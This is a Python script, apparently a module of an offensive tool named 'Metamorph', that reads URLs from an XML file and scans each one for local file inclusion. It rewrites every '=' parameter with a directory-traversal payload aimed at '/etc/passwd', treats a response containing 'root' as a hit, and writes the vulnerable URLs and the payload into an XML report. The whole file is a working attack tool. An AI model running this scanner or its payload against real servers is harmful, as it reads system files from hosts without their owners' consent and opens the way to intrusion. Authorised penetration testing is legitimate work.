from urllib.parse import urlparse
from requests import get
from sys import argv
import xml.etree.cElementTree as ET

def check_lfi(url):
    if "=" in url:
        go_back="../../../../../../../../../../"
        fichier="etc/passwd"
        url=url.replace("=",f'={go_back}{fichier}#')
        req=get(url)
        if req.status_code==200 and "root" in req.text:
            return True
    return False
def load_xml(file):
    loaded=[]
    root = ET.parse(file).getroot()
    for i in root.findall('url'):
        loaded.append(i.text)
    return loaded

def generate_xml(vuln_lfi,no_lfi):
    root = ET.Element("root")
    for i in vuln_lfi:
        if no_lfi==False:
            ET.SubElement(root, "LFI").text = i
        else:
            ET.SubElement(root, "LFI").text = "No LFI"

            
    ET.SubElement(root,"Payload").text="../../../../../../../../../../etc/passwd#"
    ET.SubElement(root,"Number").text=str(len(vuln_lfi))
    tree = ET.ElementTree(root)
    filename=urlparse(vuln_lfi[0]).netloc.replace(".","_")
    filename=filename.replace("-","_")
    tree.write("LFI_"+filename+".xml")
    print('[*] XML Generated : LFI_'+filename+".xml")


if __name__=='__main__':
    """
    Metamorph LFI Vulnerabilities Detection

    Argument : URL.xml
    Desc : Find LFI vulnerabilities in urls in URL.xml 
    Syntaxe : module lfi <url.xml>
    Info: XML generated will contains all urls vulnerable in <url>, payloads used in <payload> and the number of LFI found in <Number>
    """
    all_url=load_xml(argv[1])
    vuln_lfi=[]
    for i in all_url:
        if check_lfi(i)==True:
            vuln_lfi.append(i)
    print(f'[+] {len(vuln_lfi)} LFI found ')
    no_lfi=False
    if len(vuln_lfi)==0:
        vuln_lfi.append(all_url[0])
        no_lfi=True
    generate_xml(vuln_lfi,no_lfi)
       